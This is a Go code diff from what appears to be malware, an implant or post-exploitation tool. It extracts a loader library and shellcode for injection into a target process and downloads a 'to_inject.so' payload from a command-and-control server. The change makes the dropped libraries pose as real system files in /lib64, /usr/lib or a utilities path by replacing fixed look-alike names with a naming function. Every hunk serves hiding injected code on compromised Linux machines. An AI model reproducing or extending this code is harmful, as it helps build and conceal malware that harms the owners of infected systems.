@@ -91,12 +91,12 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 		return "", fmt.Errorf("only supports x86_64")
 	}
 
-	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
-		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
+	so_path = fmt.Sprintf("/%s/%s",
+		RuntimeConfig.UtilsPath, NameTheLibrary())
 	if os.Geteuid() == 0 {
-		so_path = fmt.Sprintf("/lib64/libpam.so.1.%d.1", util.RandInt(0, 20))
+		so_path = fmt.Sprintf("/lib64/%s", NameTheLibrary())
 	}
-	if !util.IsExist(so_path) {
+	if !util.IsFileExist(so_path) {
 		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
 		if err != nil {
 			return "", fmt.Errorf("Extract loader.so failed: %v", err)
@@ -150,7 +150,10 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 }
 
 func prepare_shared_lib() (path string, err error) {
-	path = fmt.Sprintf("/usr/lib/libBLT.2.5.so.%d.so", util.RandInt(0, 100))
+	path = fmt.Sprintf("/usr/lib/%s", NameTheLibrary())
+	if !HasRoot() {
+		path = fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, NameTheLibrary())
+	}
 	_, err = DownloadViaCC("to_inject.so", path)
 	if err != nil {
 		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
